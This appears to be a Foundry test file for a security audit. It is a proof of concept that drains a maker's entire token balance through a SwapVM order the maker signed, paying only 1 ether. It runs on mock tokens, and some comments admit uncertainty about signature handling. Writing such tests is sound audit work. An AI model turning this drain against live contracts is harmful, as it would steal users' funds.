// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// Use the repo contracts (adjust paths if your project differs)
import "../src/libs/MakerTraits.sol";
import "../src/libs/MakerTraits.sol" as MT;
import "../src/interfaces/ISwapVM.sol";
import "../src/SwapVM.sol";
import "@1inch/aqua/src/Aqua.sol";
import "../src/libs/VM.sol";
import "../src/libs/Calldata.sol";
import "../src/libs/CalldataPtr.sol";
import "../src/libs/TakerTraits.sol";
import "../src/libs/TransientLock.sol";

import "../src/contracts/ConcreteSwapVM.sol";
import "../src/contracts/MockERC20.sol";

contract ExploitExactMatchTest is Test {
    MockERC20 tokenIn;
    MockERC20 tokenOut;
    ConcreteSwapVM vmContract;
    Aqua aqua;

    // use a private key that Foundry can sign with:
    uint256 makerKey = 0xA11CE;
    address maker;
    address taker;

    function setUp() public {
        // derive addresses from keys for deterministic control
        maker = vm.addr(makerKey);
        taker = address(0xCAFE);

        // Deploy tokens
        tokenIn = new MockERC20("TokenIn", "TIN");
        tokenOut = new MockERC20("TokenOut", "TOUT");

        // Deploy Aqua (repo impl)
        aqua = new Aqua();

        // Deploy concrete SwapVM with aqua address (we will not need aqua for this test)
        vmContract = new ConcreteSwapVM(address(aqua));

        // Mint balances
        tokenIn.mint(taker, 1000 ether);
        tokenOut.mint(maker, 100 ether);

        // Maker approves vmContract to transfer tokenOut (normal setup)
        vm.prank(maker);
        tokenOut.approve(address(vmContract), type(uint256).max);

        // Taker approves tokenIn to vmContract (if amountIn pulled)
        vm.prank(taker);
        tokenIn.approve(address(vmContract), type(uint256).max);
    }

    function test_exactMatchExploit() public {
        // Build program bytes: opcode 0, args length 32, then 32-byte immediate amount
        // Attacker scenario: taker supplies small amountIn (1 ether) while maker's program
        // (signed by maker) sets amountOut to the maker's full tokenOut balance.
        // This demonstrates that if a maker signs a program allowing a large amountOut
        // and has approved the contract, a taker with moderate amountIn can drain the maker.
        uint256 makerBalance = tokenOut.balanceOf(maker);
        uint256 hugeAmount = makerBalance; // drain the maker's entire balance
        bytes memory program = bytes.concat(
            bytes1(uint8(0)),    // opcode index 0 -> set amountOut
            bytes1(uint8(32)),   // args length 32
            abi.encodePacked(uint256(hugeAmount))
        );

        // Build MakerTraitsLib.Args
        MakerTraitsLib.Args memory margs;
        margs.maker = maker;
        margs.receiver = maker;
        margs.shouldUnwrapWeth = false;
        margs.useAquaInsteadOfSignature = false; // use signed order path
        margs.allowZeroAmountIn = false;
        margs.hasPreTransferInHook = false;
        margs.hasPostTransferInHook = false;
        margs.hasPreTransferOutHook = false;
        margs.hasPostTransferOutHook = false;
        margs.preTransferInTarget = address(0);
        margs.preTransferInData = "";
        margs.postTransferInTarget = address(0);
        margs.postTransferInData = "";
        margs.preTransferOutTarget = address(0);
        margs.preTransferOutData = "";
        margs.postTransferOutTarget = address(0);
        margs.postTransferOutData = "";
        margs.program = program;

        // Build the real ISwapVM.Order using MakerTraitsLib.build
        ISwapVM.Order memory order = MakerTraitsLib.build(margs);

        // Hash the order as SwapVM expects (EIP-712)
        bytes32 orderHash = vmContract.hash(order);

        // Sign the orderHash with the maker's key (Foundry VM helper)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(makerKey, orderHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Prepare takerTraitsAndData using the official builder so parsing succeeds
        TakerTraitsLib.Args memory targs;
        targs.taker = taker;
        targs.isExactIn = true;
        targs.shouldUnwrapWeth = false;
        targs.isStrictThresholdAmount = false;
        targs.isFirstTransferFromTaker = false;
        targs.useTransferFromAndAquaPush = false;
        targs.threshold = "";
        targs.to = address(0);
        targs.hasPreTransferInCallback = false;
        targs.hasPreTransferOutCallback = false;
        targs.preTransferInHookData = "";
        targs.postTransferInHookData = "";
        targs.preTransferOutHookData = "";
        targs.postTransferOutHookData = "";
        targs.preTransferInCallbackData = "";
        targs.preTransferOutCallbackData = "";
        targs.instructionsArgs = "";
        targs.signature = signature;

        bytes memory takerTraitsAndData = TakerTraitsLib.build(targs);

        // maker already has 100 ether minted in setUp; no extra minting needed

        // As taker, call swap with a small providedIn (1 ether)
        vm.prank(taker);
        // call swap - signature is embedded in takerTraits or order: SwapVM will call recover on signature param extracted from takerTraits
        // The repo SwapVM expects the signature in takerTraits.signature(takerData). If your TakerTraits requires signature to be part of takerData,
        // you may need to pack signature into takerTraitsAndData here. If parse accepts empty taker data and SwapVM reads signature from order, adapt accordingly.
        (uint256 amountIn, uint256 amountOut, bytes32 returnedHash) = vmContract.swap{gas: gasleft()}(order, address(tokenIn), address(tokenOut), 1 ether, takerTraitsAndData);

        // Log balances after swap
        emit log_named_uint("Maker tokenOut balance after exploit", tokenOut.balanceOf(maker));
        emit log_named_uint("Taker tokenOut balance after exploit", tokenOut.balanceOf(taker));

        // Check that maker lost tokens and taker gained the full maker balance
        assertEq(tokenOut.balanceOf(maker), 0);
        assertEq(tokenOut.balanceOf(taker), makerBalance);
    }
}